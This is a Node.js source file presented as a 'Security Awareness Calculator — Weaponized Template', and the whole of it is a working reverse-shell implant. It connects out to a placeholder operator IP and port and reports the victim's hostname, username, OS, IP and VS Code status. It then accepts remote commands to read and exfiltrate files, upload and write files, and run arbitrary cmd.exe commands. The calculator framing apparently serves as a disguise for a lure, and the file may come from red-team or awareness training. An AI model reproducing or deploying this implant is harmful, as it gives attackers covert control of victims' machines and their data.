// ============================================================
// Security Awareness Calculator — Weaponized Template
//
// OPERATOR CONFIGURATION REQUIRED — replace all placeholders.
//
// The author takes no responsibility for any damage or legal
// consequences resulting from misuse of this tool.
//
// https://github.com/0xsyr0/Security-Awareness-Calculator
// ============================================================

const net  = require('net');
const cp   = require('child_process');
const fs   = require('fs');
const os   = require('os');
const path = require('path');

const OPERATOR_IP   = '<IP>';
const OPERATOR_PORT =  <PORT>;

const client = new net.Socket();

client.connect(OPERATOR_PORT, OPERATOR_IP, () => {
    const info = JSON.stringify({
        hostname: os.hostname(),
        username: process.env.USERNAME  || 'unknown',
        os:       `${os.type()} ${os.release()}`,
        ip:       Object.values(os.networkInterfaces())
                        .flat()
                        .filter(i => i.family === 'IPv4' && !i.internal)
                        .map(i => i.address)[0] || 'unknown',
        vscode:   process.env.VSCODE_PID ? 'yes' : 'no'
    });
    client.write(info);
});

let buf = Buffer.alloc(0);

client.on('data', (data) => {
    buf = Buffer.concat([buf, data]);

    while (true) {
        if (buf.length < 4) break;

        const msgLen = buf.readUInt32BE(0);

        if (buf.length < 4 + msgLen) break;

        const cmd = buf.slice(4, 4 + msgLen).toString('utf8').trim();
        buf = buf.slice(4 + msgLen);

        handleCommand(cmd);
    }
});

function handleCommand(cmd) {
    if (cmd === '__exit__') {
        client.destroy();
        return;
    }

    if (cmd === '__pwd__') {
        client.write(process.cwd() + '__done__');
        return;
    }

    if (cmd.startsWith('__cd__')) {
        const target = cmd.replace('__cd__', '').trim().replace(/\//g, '\\');
        try {
            process.chdir(target);
            client.write(process.cwd() + '__done__');
        } catch (e) {
            client.write(`cd failed: ${e.message}__done__`);
        }
        return;
    }

    if (cmd.startsWith('__mkdir__')) {
        const target = cmd.replace('__mkdir__', '').trim().replace(/\//g, '\\');
        try {
            fs.mkdirSync(target, { recursive: true });
            client.write(`Created: ${target}__done__`);
        } catch (e) {
            client.write(`mkdir failed: ${e.message}__done__`);
        }
        return;
    }

    if (cmd.startsWith('__download__')) {
        const filePath = cmd.replace('__download__', '').trim().replace(/\//g, '\\');
        try {
            const content = fs.readFileSync(filePath);
            client.write(Buffer.from(content).toString('base64') + '__done__');
        } catch (e) {
            client.write('__notfound__');
        }
        return;
    }

    if (cmd.startsWith('__upload__')) {
        const payload  = cmd.replace('__upload__', '');
        const sep      = payload.indexOf('__');
        const filePath = payload.substring(0, sep).replace(/\//g, '\\');
        const fileData = Buffer.from(payload.substring(sep + 2), 'base64');
        try {
            fs.mkdirSync(path.dirname(filePath), { recursive: true });
            fs.writeFileSync(filePath, fileData);
            client.write(`Uploaded to ${filePath}__done__`);
        } catch (e) {
            client.write(`Upload failed: ${e.message}__done__`);
        }
        return;
    }

    if (cmd.startsWith('__writefile__')) {
        const payload  = cmd.replace('__writefile__', '');
        const sep      = payload.indexOf('__');
        const filePath = payload.substring(0, sep).replace(/\//g, '\\');
        const content  = payload.substring(sep + 2);
        try {
            fs.mkdirSync(path.dirname(filePath), { recursive: true });
            fs.writeFileSync(filePath, content, 'utf8');
            client.write(`Written: ${filePath}__done__`);
        } catch (e) {
            client.write(`Write failed: ${e.message}__done__`);
        }
        return;
    }

    const PATH_CMDS = ['type', 'dir', 'copy', 'move', 'del', 'ren', 'attrib', 'icacls', 'tree'];
    const first      = cmd.split(' ')[0].toLowerCase();
    const normalised = PATH_CMDS.includes(first) ? cmd.replace(/\//g, '\\') : cmd;

    try {
        const out = cp.execSync(normalised, {
            shell:   'cmd.exe',
            timeout: 10000,
            cwd:     process.cwd()
        }).toString();
        client.write(out + '__done__');
    } catch (e) {
        client.write((e.stderr ? e.stderr.toString() : e.message) + '__done__');
    }
}

client.on('error', () => {});
client.on('close', () => {});